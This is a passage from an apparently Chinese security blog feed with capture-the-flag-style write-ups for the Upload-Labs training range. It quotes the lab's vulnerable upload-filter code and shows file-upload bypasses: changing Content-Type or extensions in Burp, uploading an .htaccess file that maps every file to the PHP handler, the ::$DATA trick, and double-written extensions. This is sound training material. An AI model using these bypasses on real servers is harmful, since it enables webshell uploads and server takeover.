false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件类型不允许上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    审查代码发现少了对<code>::$DATA</code>字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：</p><blockquote><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p></blockquote><p>​    直接上传的时候抓包在文件名后面添加<code>::$DATA</code>。</p><p><img src="https://s1.ax1x.com/2020/11/09/BbP84P.png"></p><p>​    上传访问。完工</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件类型不允许上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过<code>strrchr()</code>函数截取后缀名转换小写。</p><p>​    所以和第七题一样构造<strong>2333.php. .</strong>(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点”.”，铁定不在黑名单后缀里，实现绕过后缀检查。</p><p>​    但是这道题<strong>只能使用windows环境</strong>，因为执行了<code>deldot()</code>函数删除了最后一个点之后，文件名成了<code>2333.php.</code>，而linux环境下因为不会自动删除最后一个点而不能访问成功。</p><p>​    图前面有了就不贴了。</p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D;  UPLOAD_PATH.&#39;&#x2F;&#39;.$file_name;        </span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这道题和前面不同的是<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>，对于这个函数：<code>str_ireplace(find,replace,string,count)</code>，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名<code>2333.pphphp</code>，只有一个”php”字符串被匹配到并被替换成空串，剩下的文件名就成了<code>2333.php</code>。</p><p><img src="https://s1.ax1x.com/2020/11/09/Bb8yPf.png"></p><p>上传并访问文件。完工</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs(一)</title>
      <link href="2020/Upload-Labs1/"/>
      <url>2020/Upload-Labs1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。</p></blockquote><p>在线靶机地址：</p><ul><li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境</a></li><li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows">windows环境</a></li></ul><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>​    尝试上传php木马，发现提示上传错误</p><p><img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png"></p><p>​    提示只能上传<code>jpg、png、gif</code>类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。</p><p>​    源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    把文件后缀名改成jpg格式上传，使用<strong>burp suit</strong>抓包。把<code>.jpg</code>后缀重新改为<code>.php</code>即可实现绕过前端JS代码。</p><p><img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png"></p><p>​    然后右键打开图片，代码成功执行。完工</p><p><img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png"></p><p>​    注：后面题目的php代码都使用<code>2333.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(phpinfo());</span><br></pre></td></tr></table></figure><p>​    执行结果是打印出php版本信息。</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>​    源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    发现文件判断是根据<code>image/jpeg、image/png...</code>进行过滤判定，这些值都是Http请求中的<strong>Content-Type</strong>常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/klb561/p/10090540.html">Http请求中Content-Type</a>。</p><p>​    同样是burp抓包修改<strong>Content-Type</strong>的值。</p><p><img src="https://s1.ax1x.com/2020/11/08/BT1EXq.png"></p><p>​    打开图片，php代码成功执行。完工</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    发现只过滤了<code>.asp、.aspx、.php、.jsp</code>文件，那么可以使用<code>php3、phtml、phps、php5</code>文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 <code>phtml</code>作为后缀名；而php3，我的理解是php之前版本的文件后缀，如<code>php5</code>。</p><p>​    直接把<code>2333.php</code>改为<code>2333.php3</code>上传打开，执行成功。完工</p><p><img src="https://s1.ax1x.com/2020/11/09/BTq2cV.png"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.<code>htaccess</code>文件过滤，所以上传一个.<code>htaccess</code>文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><p>​    原理的话我讲一下个人的见解：.<code>htaccess</code>文件是一个<code>apache</code>服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为<code>php</code>。参考的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gyrgyr/p/10773118.html">htaccess使用方法介绍</a>。</p><p>​    接下来上传<code>2333.jpg</code>图片木马，再打开就会被成功解析为<code>php</code>文件并执行：</p><p><img src="https://s1.ax1x.com/2020/11/09/BTqoN9.png"></p><p><img src="https://s1.ax1x.com/2020/11/09/BTqqc6.png"></p><p>​    完工</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p> 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span 